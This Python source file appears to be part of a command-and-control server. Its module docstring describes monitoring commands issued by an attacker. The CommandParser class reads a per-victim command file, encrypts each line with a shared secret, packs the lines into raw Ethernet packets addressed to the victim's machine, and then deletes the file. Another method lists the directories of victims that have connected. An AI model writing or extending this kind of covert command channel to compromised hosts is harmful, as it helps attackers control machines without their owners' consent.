"""Module designed to monitor commands issued by attacker to queue
"""

import math
import os
import time

from threading import Thread, Timer
# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
from utils.encrypt import Encrypter
from utils.consts import SECRET
from bundler.bundler import Bundler

class CommandParser():

    def __init__(self, config):
        self.config = config

    def parse(self, victim_mac, victim_pkt, rel_path, command_file):
        """Parses the input file in the input directory of victim and builds packet for command
        
        Arguments:
            victim_mac {Mac} -- object representing Mac address of user
            victim_pkt {Ether} -- packet sent from client
            rel_path {string} -- the relative path to the data folder
            command_file {string} -- name of the command file to look for
        
        Returns:
            Ether[] -- list of constructed packets to be sent to the client
        """

        # Read corresponding folder for input file
        pkts = []
        path = rel_path + '/input/' + command_file
        if os.path.isfile(path):
            bundler = Bundler(victim_mac, victim_pkt, self.config)

            # Open file contents, encrypt, and build response packet
            with open(path) as f:
                parsed_commands = []

                for line in f:
                    line = line.replace('\n', '')
                    parsed_commands.append(Encrypter(line, SECRET).encrypt())
                    # parsed_commands.append(line)

                for cmd in parsed_commands:
                    pkt = bundler.build_command_pkt(cmd)
                    pkts.append(pkt)
        
            os.remove(path) # Done reading file
        return pkts

    def _get_victim_dirs(self):
        """Get corresponding victims that connected to the server
        """
        res = []
        for victim in os.listdir(self.dir):
            if os.path.isdir(os.path.join(self.dir, victim)):
                res.append(os.path.join(self.dir, victim))

        return res
